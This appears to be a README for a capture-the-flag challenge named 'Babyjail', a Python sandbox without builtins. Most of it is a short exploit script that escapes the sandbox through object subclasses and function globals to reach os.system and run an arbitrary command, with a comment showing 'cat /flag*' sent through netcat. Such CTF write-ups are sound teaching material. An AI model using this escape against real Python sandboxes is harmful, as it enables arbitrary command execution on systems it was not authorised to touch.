@@ -1,0 +1,19 @@
+# Babyjail
+
+- Author: Vincent55
+- Category: Misc
+- Difficulty: Baby
+
+Just a normal pyjail without builtins!
+
+## exploit
+```python
+import sys
+
+payload = "''.__class__.__base__.__subclasses__()[-4].close.__globals__['system']('<PWNPWN>')"
+payload = payload.replace("<PWNPWN>", sys.argv[1])
+
+print(payload)
+
+# python exploit.py "cat /flag*" | nc localhost 10002
+```
